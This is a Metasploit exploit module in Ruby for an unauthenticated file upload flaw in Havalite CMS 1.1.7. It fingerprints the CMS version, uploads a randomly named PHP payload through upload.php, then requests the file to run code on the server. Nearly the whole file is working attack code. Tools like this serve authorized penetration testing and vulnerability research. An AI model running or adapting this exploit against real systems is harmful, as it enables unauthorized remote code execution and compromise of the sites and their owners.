# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Havalite CMS Arbitary File Upload Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a file upload vulnerability found in Havalite CMS 1.1.7, and
        possibly prior.  Attackers can abuse the upload feature in order to upload a
        malicious PHP file without authentication, which results in arbitary remote code
        execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;CWH&#039;,
          &#039;sinn3r&#039;  #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;94405&#039;],
          [&#039;EDB&#039;, &#039;26243&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;Platform&#039;       => [&#039;linux&#039;, &#039;php&#039;],
      &#039;Targets&#039;        =>
        [
          [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; }  ],
          [ &#039;Linux x86&#039;            , { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039;} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Jun 17 2013",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to havalite&#039;, &#039;/&#039;])
        ], self.class)
  end


  def peer
    "#{rhost}:#{rport}"
  end


  #
  # Checks if target is running HavaLite CMS 1.1.7
  # We only flag 1.1.7 as vulnerable, because we don&#039;t have enough information from
  # the vendor or OSVDB about exactly which ones are really vulnerable.
  #
  def check
    uri = normalize_uri(target_uri.path, &#039;havalite/&#039;)
    res = send_request_raw({&#039;uri&#039; => uri})

    if not res
      print_error("#{peer} - Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    js_src = res.body.scan(/<script type="text\/javascript">(.+)<\/script>/im).flatten[0] || &#039;&#039;
    version = js_src.scan(/var myVersion = &#039;(.+)&#039;;/).flatten[0] || &#039;&#039;

    if not version.empty? and version =~ /1\.1\.7/
      print_status("#{peer} - Version found: #{version}")
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Unknown
  end


  #
  # Uploads our malicious file
  #
  def upload(base)
    p     = get_write_exec_payload(:unlink_self=>true)
    fname = "#{rand_text_alpha(5)}.php"

    data = Rex::MIME::Message.new
    data.add_part(p, "application/octet-stream", nil, "form-data; name=\"files[]\"; filename=\"#{fname}\"")
    post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(base, &#039;havalite&#039;, &#039;upload.php&#039;),
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;   => post_data
    })

    if not res
      fail_with(Exploit::Failure::Unknown, "#{peer} - Request timed out while uploading")
    elsif res.code.to_i == 404
      fail_with(Exploit::Failure::NotFound, "#{peer} - No upload.php found")
    elsif res.body =~ /"error"\:"abort"/
      fail_with(Exploit::Failure::Unknown, "#{peer} - Unable to write #{fname}")
    end

    return fname
  end


  #
  # Executes our uploaded malicious file
  #
  def exec(base, payload_fname)
    res = send_request_raw({
      &#039;uri&#039; => normalize_uri(base, &#039;havalite&#039;,&#039;tmp&#039;, &#039;files&#039;, payload_fname)
    })

    if res and res.code == 404
      fail_with(Exploit::Failure::NotFound, "#{peer} - Not found: #{payload_fname}")
    end
  end


  def exploit
    base = target_uri.path

    print_status("#{peer} - Uploading malicious file...")
    fname = upload(base)

    print_status("#{peer} - Executing #{fname}...")
    exec(base, fname)
  end
end

